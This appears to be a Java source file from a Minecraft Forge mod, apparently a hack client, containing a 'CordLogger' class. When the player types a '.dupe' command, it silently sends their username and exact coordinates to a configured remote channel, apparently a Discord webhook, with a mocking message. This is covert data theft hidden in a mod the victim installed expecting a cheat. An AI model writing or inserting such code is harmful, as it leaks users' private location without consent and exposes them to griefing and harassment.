package com.example.examplemod.Hacks.Print.CordLogger;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class CordLogger {
   public static String bebra = "";
   Minecraft mc = Minecraft.getMinecraft();

   @SubscribeEvent
   public void ChatEvent(ClientChatEvent e) {
      String msg = e.getMessage();
      String[] sentences = e.getMessage().split(" ");
      if (e.getMessage().contains(".dupe")) {
         SendMessage.doThing("```Kid with nick **" + Minecraft.getMinecraft().getSession().getUsername() + "** Used .dupe command XD, COORDS: -------->" + this.mc.player.posX + " Y:" + this.mc.player.posY + " Z:" + this.mc.player.posZ + "```", Cfg.CordLogChannel);
      }

   }
}
